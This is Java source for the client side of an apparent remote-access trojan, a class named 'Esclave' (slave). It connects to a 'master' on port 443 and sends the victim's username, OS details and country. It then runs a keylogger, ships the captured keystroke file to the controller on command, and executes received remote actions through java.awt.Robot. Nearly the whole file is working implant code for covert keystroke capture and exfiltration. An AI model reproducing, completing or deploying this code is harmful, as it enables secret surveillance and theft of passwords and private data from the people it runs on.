package client;

import java.awt.AWTException;
import java.awt.Robot;
import java.io.BufferedInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.PrintStream;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.Socket;
import java.net.UnknownHostException;

import constante.Constante;
import remote.action.Keylogging;
import remote.action.Notification;
import remote.action.RemoteActions;
import send.specific.object.SendSpecificObject;

public class Esclave {

	private final static int portMaitre = 443;
	private final static String addresseMaitre = "localhost";
	private static InetAddress addresse;

	private static ObjectInputStream in;
	private static ObjectOutputStream out;
	private Socket s;
	private Keylogging klgg;
	private Robot robot;

	public Esclave() {

		try {
			s = new Socket(InetAddress.getLocalHost(), portMaitre);
			addresse = s.getInetAddress();

			out = new ObjectOutputStream(s.getOutputStream());
			in = new ObjectInputStream(new BufferedInputStream(
					s.getInputStream()));
			String fileseparator = System.getProperty("file.separator"), username = System
					.getProperty("user.name"), os_version = System
					.getProperty("os.version"), os_name = System
					.getProperty("os.name"), os_arch = System
					.getProperty("os.arch"), user_country = System
					.getProperty("user.country");
			out.writeObject(addresse + " " + fileseparator + " " + username
					+ " " + os_version + " " + os_name + " " + os_arch + " "
					+ user_country);
			out.flush();
			
			klgg = new Keylogging(this);
			robot = new Robot();
		} catch (IOException | AWTException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	public void receive() throws ClassNotFoundException, IOException,
			InterruptedException {
		Thread recevoir = new Thread("Receive") {
			public void run() {

				try {
					while (true) {
						Object action;

						action = (Object) in.readObject();

						if (action instanceof Integer) {
							Integer code=(Integer) action;
							if(code.equals(Constante.code_keylog)){
								sendfileKeylog();
							}
							else if(code.equals(Constante.code_notif)){
								Notification notif=new Notification();
							}
							else{
								System.out.println("Objet non identifie");
							}
						}
						else if(action instanceof RemoteActions){
							RemoteActions remoteaction=(RemoteActions) action;
							Object result=((RemoteActions) action).executer(robot);
							if(result != null){
								Integer code=120;
								out.writeObject(120);
								out.flush();
								out.writeObject(result);
								out.flush();
								out.reset();
							}
						}
					}
				} catch (ClassNotFoundException | IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (InterruptedException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (AWTException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
		};
		recevoir.start();
	}

	

	public void sendfileKeylog() throws IOException, InterruptedException {
		String chemin = Keylogging.cheminFile;
		klgg.arreteKeylog();
		SendSpecificObject.sendFile(chemin, out);
		klgg = new Keylogging(this);
	}

	public static void main(String[] args) throws ClassNotFoundException,
			IOException, InterruptedException {
		Esclave esclave = new Esclave();
		esclave.receive();
	}
}
